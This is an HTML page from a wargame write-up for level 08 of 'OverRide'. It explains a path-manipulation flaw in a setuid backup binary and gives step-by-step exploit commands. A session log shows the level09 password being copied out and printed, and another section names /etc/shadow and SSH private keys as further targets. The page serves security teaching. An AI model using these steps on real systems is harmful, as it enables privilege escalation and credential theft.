<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-level08" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">ğŸ—‚ï¸ Level 08 | Over Ride</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://your-docusaurus-site.example.com/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://your-docusaurus-site.example.com/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://your-docusaurus-site.example.com/docs/level08"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="ğŸ—‚ï¸ Level 08 | Over Ride"><meta data-rh="true" name="description" content="&lt;MissionObjective"><meta data-rh="true" property="og:description" content="&lt;MissionObjective"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://your-docusaurus-site.example.com/docs/level08"><link data-rh="true" rel="alternate" href="https://your-docusaurus-site.example.com/docs/level08" hreflang="en"><link data-rh="true" rel="alternate" href="https://your-docusaurus-site.example.com/docs/level08" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"ğŸ—‚ï¸ Level 08","item":"https://your-docusaurus-site.example.com/docs/level08"}]}</script><link rel="stylesheet" href="/assets/css/styles.3349b886.css">
<script src="/assets/js/runtime~main.67a54dce.js" defer="defer"></script>
<script src="/assets/js/main.d9d2e099.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="Over Ride Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="Over Ride Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">EBAH</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">Tutorial</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">ğŸ›¡ï¸ OverRide Documentation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level00">ğŸ§© Level 00</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level01">ğŸ” Level 01</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level02">ğŸ’£ Level 02</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level03">ğŸ” Level 03</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level04">ğŸ§¼ Level 04</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level05">ğŸ§â€â™‚ï¸ Level 05</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level06">ğŸ§ª Level 06</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/level07">ğŸ§ƒ Level 07</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" href="/docs/level08">ğŸ—‚ï¸ Level 08</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro_new">intro_new</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">ğŸ—‚ï¸ Level 08</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>ğŸ—‚ï¸ Level 08</h1></header>
<div class="missionCard_aJIf"><div class="missionHeader_ujCY"><span class="levelBadge_E6Y7">Level 08</span><h2 class="missionTitle_MLqA">Mission Objective</h2></div><div class="missionContent_AuQf"><p class="missionText_YjWt">Gain access to user <code class="targetCode_IWAs">level09 privileges</code> by exploiting <!-- -->Path manipulation and setuid privilege abuse<!-- -->.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="vulnerability-analysis">Vulnerability Analysis<a href="#vulnerability-analysis" class="hash-link" aria-label="Direct link to Vulnerability Analysis" title="Direct link to Vulnerability Analysis">â€‹</a></h2>
<div class="card_anxl"><div class="header_h_Kv"><h3 class="title_xshN">Path Traversal &amp; Setuid Privilege Abuse</h3><span class="severityBadge_p8m1" style="background-color:#f9731620;color:#f97316;border-color:#f9731640">HIGH</span></div><p class="description_LGUH">Binary creates backup copies of files with setuid privileges but lacks path sanitization. By manipulating working directory and folder structure, we can force it to copy restricted files to accessible locations.</p><div class="techniques_SXJm"><h4 class="techniquesTitle_X_0j">Techniques</h4><div class="techniquesList_aLL1"><span class="techniqueTag_HgBs">Path Manipulation</span><span class="techniqueTag_HgBs">Setuid Abuse</span><span class="techniqueTag_HgBs">Directory Traversal</span><span class="techniqueTag_HgBs">Relative Path Exploitation</span></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="program-behavior-analysis">Program Behavior Analysis<a href="#program-behavior-analysis" class="hash-link" aria-label="Direct link to Program Behavior Analysis" title="Direct link to Program Behavior Analysis">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Binary Usage</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV">./level08 filename</span></div><pre class="output_eCt5">Usage: ./level08 &lt;filename&gt;
Program expects a filename as argument
Creates backup in ./backups/ directory</pre></div></div>
<p><strong>Core Functionality:</strong></p>
<ul>
<li>Reads source file with setuid privileges (level09)</li>
<li>Creates backup copy in <code>./backups/</code> + filename</li>
<li>No path validation or sanitization</li>
<li>Relative destination path vulnerable to manipulation</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="source-code-analysis">Source Code Analysis<a href="#source-code-analysis" class="hash-link" aria-label="Direct link to Source Code Analysis" title="Direct link to Source Code Analysis">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Pseudocode Logic</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># Simplified program flow</span></div><pre class="output_eCt5">FILE *log = fopen(&quot;./backups/.log&quot;, &quot;w&quot;);
fprintf(log, &quot;Starting back up: %s\n&quot;, argv[1]);

FILE *source = fopen(argv[1], &quot;r&quot;);  // Read with setuid privileges

char dest[100];
strcpy(dest, &quot;./backups/&quot;);
strncat(dest, argv[1], 99 - strlen(dest));  // No path sanitization!

int fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0640);

// Copy file byte by byte
while ((c = fgetc(source)) != EOF) {
  write(fd, &amp;c, 1);
}

fprintf(log, &quot;Finished back up: %s\n&quot;, argv[1]);</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="vulnerability-deep-dive">Vulnerability Deep Dive<a href="#vulnerability-deep-dive" class="hash-link" aria-label="Direct link to Vulnerability Deep Dive" title="Direct link to Vulnerability Deep Dive">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Path Construction Vulnerability</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># Example path construction</span></div><pre class="output_eCt5">Input: /home/users/level09/.pass

Source path: /home/users/level09/.pass (absolute)
â†’ Read with setuid privileges âœ“

Destination: ./backups/ + /home/users/level09/.pass
â†’ ./backups//home/users/level09/.pass (relative to CWD)
â†’ Controllable by attacker! âœ“</pre></div></div>
<p><strong>Critical Issues:</strong></p>
<ol>
<li><strong>No path sanitization</strong>: Argument used directly in file operations</li>
<li><strong>Relative destination</strong>: <code>./backups/</code> depends on current working directory</li>
<li><strong>Setuid read privilege</strong>: Can access restricted files</li>
<li><strong>Directory creation</strong>: No validation of destination path components</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation-strategy">Exploitation Strategy<a href="#exploitation-strategy" class="hash-link" aria-label="Direct link to Exploitation Strategy" title="Direct link to Exploitation Strategy">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Attack Methodology</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># Exploitation approach</span></div><pre class="output_eCt5">1. Choose writable directory (/tmp)
2. Create matching folder structure
3. Manipulate working directory
4. Force program to copy restricted file
5. Read copied content from accessible location</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-by-step-exploitation">Step-by-Step Exploitation<a href="#step-by-step-exploitation" class="hash-link" aria-label="Direct link to Step-by-Step Exploitation" title="Direct link to Step-by-Step Exploitation">â€‹</a></h2>
<div class="stepsContainer_pG2T"><div class="step_fonX"><div class="stepHeader_lANh"><span class="stepNumber_JMan">1</span><h3 class="stepTitle_pSoA">Setup Working Directory</h3></div><p class="stepDescription_I1sy">Move to writable location where we can create folder structure</p><div class="codeBlock_MNNe"><div class="commandLine_KPva"><span class="prompt_hyWW">$</span><code class="command_dhjP">cd /tmp</code></div></div></div><div class="step_fonX"><div class="stepHeader_lANh"><span class="stepNumber_JMan">2</span><h3 class="stepTitle_pSoA">Create Destination Structure</h3></div><p class="stepDescription_I1sy">Pre-create the folder path where backup will be written</p><div class="codeBlock_MNNe"><div class="commandLine_KPva"><span class="prompt_hyWW">$</span><code class="command_dhjP">mkdir -p ./backups/home/users/level09/</code></div></div></div><div class="step_fonX"><div class="stepHeader_lANh"><span class="stepNumber_JMan">3</span><h3 class="stepTitle_pSoA">Execute Privilege Abuse</h3></div><p class="stepDescription_I1sy">Run setuid binary to copy restricted file</p><div class="codeBlock_MNNe"><div class="commandLine_KPva"><span class="prompt_hyWW">$</span><code class="command_dhjP">~/level08 /home/users/level09/.pass</code></div></div></div><div class="step_fonX"><div class="stepHeader_lANh"><span class="stepNumber_JMan">4</span><h3 class="stepTitle_pSoA">Read Extracted Data</h3></div><p class="stepDescription_I1sy">Access the copied restricted file content</p><div class="codeBlock_MNNe"><div class="commandLine_KPva"><span class="prompt_hyWW">$</span><code class="command_dhjP">cat ./backups/home/users/level09/.pass</code></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="complete-exploit-demonstration">Complete Exploit Demonstration<a href="#complete-exploit-demonstration" class="hash-link" aria-label="Direct link to Complete Exploit Demonstration" title="Direct link to Complete Exploit Demonstration">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Full Exploitation Sequence</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># Complete attack chain</span></div><pre class="output_eCt5">level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp$ su level09
Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level09@OverRide:~$ whoami
level09</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="technical-analysis">Technical Analysis<a href="#technical-analysis" class="hash-link" aria-label="Direct link to Technical Analysis" title="Direct link to Technical Analysis">â€‹</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="path-resolution-mechanics">Path Resolution Mechanics<a href="#path-resolution-mechanics" class="hash-link" aria-label="Direct link to Path Resolution Mechanics" title="Direct link to Path Resolution Mechanics">â€‹</a></h3>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Understanding Relative vs Absolute Paths</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># How the OS resolves the paths</span></div><pre class="output_eCt5">Source: /home/users/level09/.pass
â†’ Absolute path, resolved from root
â†’ Setuid binary can read this file

Destination: ./backups//home/users/level09/.pass  
â†’ Relative to current working directory
â†’ If CWD is /tmp, actual path becomes:
â†’ /tmp/backups/home/users/level09/.pass</pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="setuid-privilege-model">Setuid Privilege Model<a href="#setuid-privilege-model" class="hash-link" aria-label="Direct link to Setuid Privilege Model" title="Direct link to Setuid Privilege Model">â€‹</a></h3>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>How Setuid Exploitation Works</strong></div><div class="admonitionContent_BuS1"><ul>
<li><strong>Effective UID</strong>: Process runs with level09 privileges</li>
<li><strong>File Access</strong>: Can read files owned by level09</li>
<li><strong>Write Operations</strong>: Destination still respects file system permissions</li>
<li><strong>Working Directory</strong>: Inherited from calling process (user-controlled)</li>
</ul></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="directory-structure-analysis">Directory Structure Analysis<a href="#directory-structure-analysis" class="hash-link" aria-label="Direct link to Directory Structure Analysis" title="Direct link to Directory Structure Analysis">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Required Folder Hierarchy</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV">tree /tmp/backups/</span></div><pre class="output_eCt5">/tmp/backups/
â””â”€â”€ home
  â””â”€â”€ users
      â””â”€â”€ level09
          â””â”€â”€ .pass  # This is where our copied file appears

4 directories, 1 file</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="alternative-attack-vectors">Alternative Attack Vectors<a href="#alternative-attack-vectors" class="hash-link" aria-label="Direct link to Alternative Attack Vectors" title="Direct link to Alternative Attack Vectors">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Other Potential Targets</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># What other files could we copy?</span></div><pre class="output_eCt5">~/level08 /etc/passwd
â†’ Copy system password file

~/level08 /home/users/level09/.ssh/id_rsa  
â†’ Copy SSH private keys

~/level08 /etc/shadow
â†’ Copy password hashes (if readable)</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="protection-bypass-analysis">Protection Bypass Analysis<a href="#protection-bypass-analysis" class="hash-link" aria-label="Direct link to Protection Bypass Analysis" title="Direct link to Protection Bypass Analysis">â€‹</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="why-common-defenses-fail">Why Common Defenses Fail<a href="#why-common-defenses-fail" class="hash-link" aria-label="Direct link to Why Common Defenses Fail" title="Direct link to Why Common Defenses Fail">â€‹</a></h3>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span><strong>Security Mechanism Bypasses</strong></div><div class="admonitionContent_BuS1"><ul>
<li><strong>Path Sanitization</strong>: Completely absent in this implementation</li>
<li><strong>Chroot/Jail</strong>: Not implemented, absolute paths work normally</li>
<li><strong>Permission Checks</strong>: Only applied to destination, not source</li>
<li><strong>Symlink Protection</strong>: No symlink validation performed</li>
</ul></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="debugging-the-vulnerability">Debugging the Vulnerability<a href="#debugging-the-vulnerability" class="hash-link" aria-label="Direct link to Debugging the Vulnerability" title="Direct link to Debugging the Vulnerability">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Understanding the Flow with strace</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV">strace -f ~/level08 /home/users/level09/.pass</span></div><pre class="output_eCt5">openat(AT_FDCWD, &quot;/home/users/level09/.pass&quot;, O_RDONLY) = 3
openat(AT_FDCWD, &quot;./backups//home/users/level09/.pass&quot;, 
     O_WRONLY|O_CREAT|O_TRUNC, 0640) = 4
     
â†’ Source opened with absolute path
â†’ Destination opened relative to CWD</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="key-learning-points">Key Learning Points<a href="#key-learning-points" class="hash-link" aria-label="Direct link to Key Learning Points" title="Direct link to Key Learning Points">â€‹</a></h2>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>File System Security Concepts</strong></div><div class="admonitionContent_BuS1"><ul>
<li><strong>Setuid Binary Analysis</strong>: Understanding privilege inheritance</li>
<li><strong>Path Manipulation</strong>: Exploiting relative path construction</li>
<li><strong>Working Directory Control</strong>: How CWD affects file operations</li>
<li><strong>Privilege Escalation</strong>: Reading restricted files via setuid abuse</li>
</ul></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="code-review-lessons">Code Review Lessons<a href="#code-review-lessons" class="hash-link" aria-label="Direct link to Code Review Lessons" title="Direct link to Code Review Lessons">â€‹</a></h2>
<div class="codeContainer_ZrQf"><div class="codeHeader_PMJ9"><span class="codeTitle_tp4q">Secure Implementation Requirements</span><button class="copyButton_vymH">Copy</button></div><div class="codeContent_hjih"><div class="commandSection_kIAe"><span class="prompt_g6zt">$</span><span class="command_jQGV"># What should have been done</span></div><pre class="output_eCt5">1. Path sanitization: Reject ../ and absolute paths
2. Destination validation: Ensure writes stay in safe directory
3. Drop privileges: Don&#x27;t maintain setuid for file copying
4. Canonical paths: Resolve all paths to absolute before use
5. Access controls: Verify user can read source legitimately</pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="technical-summary">Technical Summary<a href="#technical-summary" class="hash-link" aria-label="Direct link to Technical Summary" title="Direct link to Technical Summary">â€‹</a></h2>
<p>This level demonstrates:</p>
<ol>
<li><strong>Setuid Binary Analysis</strong> - Understanding privilege inheritance and abuse</li>
<li><strong>Path Manipulation Attacks</strong> - Exploiting relative path construction</li>
<li><strong>File System Security</strong> - Working directory and permission interactions</li>
<li><strong>Privilege Escalation</strong> - Reading restricted files through design flaws</li>
<li><strong>Code Review Skills</strong> - Identifying missing input validation</li>
</ol>
<p>The vulnerability showcases how seemingly innocent file operations can become security risks when combined with elevated privileges and insufficient input validation. This is a classic example of <strong>confused deputy</strong> problem</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level08.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/level07"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">ğŸ§ƒ Level 07</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/intro_new"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">intro_new</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#vulnerability-analysis" class="table-of-contents__link toc-highlight">Vulnerability Analysis</a></li><li><a href="#program-behavior-analysis" class="table-of-contents__link toc-highlight">Program Behavior Analysis</a></li><li><a href="#source-code-analysis" class="table-of-contents__link toc-highlight">Source Code Analysis</a></li><li><a href="#vulnerability-deep-dive" class="table-of-contents__link toc-highlight">Vulnerability Deep Dive</a></li><li><a href="#exploitation-strategy" class="table-of-contents__link toc-highlight">Exploitation Strategy</a></li><li><a href="#step-by-step-exploitation" 